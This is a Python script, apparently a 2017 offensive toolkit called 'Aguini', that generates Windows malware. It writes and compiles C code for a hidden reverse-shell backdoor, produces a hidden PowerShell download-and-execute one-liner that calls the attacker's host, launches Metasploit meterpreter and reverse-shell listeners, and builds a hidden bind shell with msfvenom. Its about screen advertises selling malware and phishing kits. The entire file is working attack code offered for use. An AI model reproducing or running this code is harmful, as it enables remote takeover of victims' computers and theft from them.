#!/usr/bin/python
# coding=utf-8
#####################################################################################
#Autor:Javier .O Benitez @shark_0 y Jey Zeta
#Copyright (C) 2017 Aguini @shark_0 y Jey Zeta
#fecha: 19-1-2017
#Si quieres lograr algo con lo que siempre as soñado debes hacer lo que nunca as echo.
#####################################################################################
import os
import io
import sys

#clear terminal
clear = lambda : os.system('clear')
clear()

exit = lambda : os.system('exit')
exit()

#create backdoor
def backdoor(host, port):
	with io.FileIO(".backdoor.c", "w") as file:
		file.write('''
#include <winsock2.h>
#include <stdio.h>

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib,"ws2_32")

  WSADATA wsaData;
  SOCKET Winsock;
  SOCKET Sock;
  struct sockaddr_in hax;
  char ip_addr[16];
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;

//int main(int argc, char *argv[])
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow)
{

    FreeConsole();

    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    struct hostent *host;
    host = gethostbyname("'''+host+'''");
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi("'''+port+'''"));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);

    memset(&ini_processo,0,sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&ini_processo,&processo_info);
}
''')



#create the shell
def shell(host):
    file = open ('shell.PS1', 'w')
    file.write("powershell.exe -nop -w hidden -c $z=new-object net.webclient;$z.proxy=[Net.WebRequest]::GetSystemWebProxy();$z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $z.downloadstring"+'('"'"'http://'+host+':8080/'"'"');')
    file.close()
    print "\nyour shell is ready :^)"

def listener(host,port):
    os.system('msfconsole -x "use exploit/multi/script/web_delivery;\set URIPATH /;\set target 2;\set payload windows/meterpreter/reverse_tcp;\set LHOST '+host+';\set LPORT '+port+';\exploit"')

def listener2(host, port):
    os.system('msfconsole -x "use multi/handler;\set LHOST '+host+';\set LPORT '+port+';\set PAYLOAD windows/shell_reverse_tcp;\exploit -j"')







print """
         _______             ||||
     /\ |  _____|  ___   ___  __   __         ||||
    /  \| |       |  |   |  ||   ||  |        ___
   /    \ |   ____\  \   /  /|   ||  |______ |   |
  /   ^  \|  |__  |\  \ /  / |   ||  | __  | |   |
 /   /\   \  __|  | \     /__|   ||  | | | |_|   |
/_ _/  \_ _\______|  \___/_______| ____| |_|_____|....
......................................................
......................................BY Javier Benitez @Shark_0 y Jey Zeta
.................Copyright (C) 2017 Aguini @shark_0 y Jey Zeta"""


print """
options:

1.Generate shell file.
2.set listener.
3.Generate shell or backdoor and start listener.
4.generate backdoor.
5.generate bind shell.
6.About.
..................................

"""
option = input("set option -> ")

#create shell
if(option == 1):
  host = raw_input("\nset (Lhost) > ")
  shell(host)

#set listeners
if(option == 2):
 print "\n1.for listen shell!"
 print "2.for listen backdoor!"
 lister = input("\nselect your listener -> ")
 if(lister == 1):
   host = raw_input("set (Lhost) > ")
   port = raw_input("set (Lport) > ")
   listener(host,port)

 if(lister == 2):
   host = raw_input("set (Lhost) > ")
   port = raw_input("set (Lport) > ")
   listener2(host,port)


if(option == 3):
   print "\n1.generate shell and listen!"
   print "2.generate backdoor and listen!"
   SorB = input("select one option -> ")

   if(SorB == 1):
      host = raw_input("set (Lhost) > ")
      port = raw_input("set (Lport) > ")
      shell(host)
      os.system('msfconsole -x "use exploit/multi/script/web_delivery;\set URIPATH /;\set target 2;\set payload windows/meterpreter/reverse_tcp;\set LHOST '+host+';\set LPORT '+port+';\exploit"')

   if(SorB == 2):
      host = raw_input("set (Lhost) > ")
      port = raw_input("set (Lport) > ")
      backdoor(host, port)
      print "\ncompile to .exe"
      os.system("/usr/bin/i686-w64-mingw32-gcc .backdoor.c -o /root/Desktop/backdoor.exe -lws2_32")
      print "\nyour backdoor is ready :^)"
      os.system("rm .backdoor.c")
      print "\nstart listener..."

      #backdoor listener2
      listener2(host, port)

#create backdoor
if(option == 4):
  host = raw_input("set (Lhost) > ")
  port = raw_input("set (Lport) > ")
  backdoor(host, port)
#compile to .exe
  print "\ncompile to .exe"
  os.system("/usr/bin/i686-w64-mingw32-gcc .backdoor.c -o /root/Desktop/backdoor.exe -lws2_32")
  print "\nyour backdoor is ready :^)"


if(option == 5):
   host = raw_input("set (Ahost) > ")
   port = raw_input("set (Lport) > ")
   print "\ngenerate your blind shell. Please wait!"
   os.system("msfvenom -p windows/shell_hidden_bind_tcp ahost="+host+" lport="+port+" -f psh-cmd > /root/Desktop/B-shell.bat")
   print "\nyour shell is ready :^)"

if(option ==6):
   print "---------------------------------"
   print "\nTelegram: @shark_0"
   print "\nTwitter: @Sh4Rk_0"
   print "\n[!] Para mas info o ventas de malware, phishing o scripts puedes comunicarte conmigo por telegram o twitter. [!]"
   print "\nCopyright (C) 2017 Aguini @shark_0"
   print "---------------------------------"

